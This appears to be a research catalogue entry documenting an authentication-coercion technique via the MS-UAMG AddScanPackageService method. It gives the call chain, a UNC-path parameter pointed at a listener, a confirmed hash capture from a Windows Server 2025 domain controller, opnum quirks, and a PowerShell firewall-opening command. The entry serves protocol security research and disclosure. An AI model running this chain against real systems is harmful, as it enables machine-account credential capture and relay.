# MS-UAMG - Remote call to IUpdateServiceManager2::AddScanPackageService (opnum 13)

## Summary

+ **Protocol**: [[MS-UAMG]: Update Agent Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/3969aaac-7a2c-4a25-854f-ec65a466df05)

+ **Interface**: `IUpdateServiceManager2` (IID `0BB8531D-7E8D-424F-986C-A0B8F60A3E7B`), reached by **DCOM activation** of the `UpdateServiceManager` coclass (CLSID `F8D253D9-89A4-4DAA-87B6-1168369F0B21`). `AddScanPackageService` is inherited from the base `IUpdateServiceManager`. No named pipe.

+ **Function name**: [`AddScanPackageService`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/2b490acc-b4db-4456-9702-cbf317fb09a9)

+ **Function operation number**: `13` per [MS-UAMG]; **observed on-wire as `12` on Windows Server 2025** (build 26100) — see the opnum note below.

+ **Authenticated**: Yes (local administrator; WUA DCOM launch/access)

## Description

`AddScanPackageService` registers a **scan package** as a virtual update service. The Windows Update
Agent **opens `scanFileLocation` synchronously** to read the scan-package cabinet, so a UNC path
there makes the WUA COM server (running as the machine account) authenticate outbound to the
listener — an authentication coercion.

```cpp
HRESULT AddScanPackageService(
   [in] BSTR serviceName,
   [in] BSTR scanFileLocation,
   [in] LONG flags,
   [out, retval] IUpdateService** ppService
 );
```

+ **Coerced parameter**: `scanFileLocation` (BSTR, UNC to the scan-package cab).
+ **serviceName**: any display name (unlike `AddService2::serviceID`, it is **not** parsed as a GUID).
+ **flags**: `0` is sufficient.

### Why this and not `AddService2`

`IUpdateServiceManager2::AddService2` (opnum 18 spec / 17 on-wire) was the originally-flagged
candidate, but on Windows Server 2025 it **registers the service without synchronously opening
`authorizationCabPath`** (it returns `S_OK` and reads the cab later, if ever), so it does **not**
produce an immediate coercion. `AddScanPackageService` reads its cab **immediately** to build the
scan service, which is what fires the outbound authentication.

## Testing status — CONFIRMED (with a required non-default firewall exception)

**Confirmed coercion on Windows Server 2025** (domain controller), 2026-09-14. Chain via
[`poc/python/coerce_poc.py`](./poc/python/coerce_poc.py):

```
CoCreateInstanceEx(CLSID_UpdateServiceManager, IID_IUpdateServiceManager2)
QueryInterface IUpdateServiceManager2
AddScanPackageService(serviceName="scan", scanFileLocation="\\<listener>\share\scan.cab", flags=0)
  -> listener: TMP-W-2025-DC1$ authenticated (NTLMv2 captured)
```

The WUA agent opened the UNC and authenticated as the DC machine account before failing to parse it
(`0x8007007b` ERROR_INVALID_NAME — a benign post-auth status; only the captured hash is evidence).

### Opnum note (Server 2025)

[MS-UAMG] documents `AddScanPackageService` at **opnum 13**. On Windows Server 2025 (build 26100) the
`IUpdateServiceManager2` on-wire vtable is shifted by **-1** (this build exposes one fewer method
than the published interface — opnums `0-17` valid, `18+` return `RPC_S_PROCNUM_OUT_OF_RANGE`), so
the method is actually reached at **opnum 12**, and `AddService2` at opnum 17 (not 18). The PoC tries
opnum 12 first and falls back to 13, so it works on both current and older builds.

### PREREQUISITES

1. **Local administrator** on the target.
2. **A non-default, manually-created firewall exception.** The `UpdateServiceManager` COM object is
   activated **out-of-process in `dllhost.exe` (COM Surrogate)** on a **dynamic** RPC port, and
   **there is no predefined Windows firewall rule group** for it (unlike MS-VDS "Remote Volume
   Management" or MS-PLA "Performance Logs and Alerts"). DCOM activation on TCP/135 succeeds but the
   interface call is dropped by the firewall unless an administrator explicitly opens it, e.g.:

   ```powershell
   # program-scoped to the COM surrogate -> follows the dynamic port:
   New-NetFirewallRule -DisplayName "COM Surrogate RPC" -Direction Inbound -Action Allow `
     -Protocol TCP -Program "%SystemRoot%\System32\dllhost.exe" -Profile Any
   # or open the RPC dynamic range 49152-65535.
   ```

   This is a deliberate, non-default exposure — documented here so it is not mistaken for stock
   behaviour. Without it the method is not remotely reachable.

## References

+ [MS-UAMG]: Update Agent Management Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/3969aaac-7a2c-4a25-854f-ec65a466df05

+ [MS-UAMG] 4.2 Adding a New Update Service Based on a Scan Package: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/2b490acc-b4db-4456-9702-cbf317fb09a9
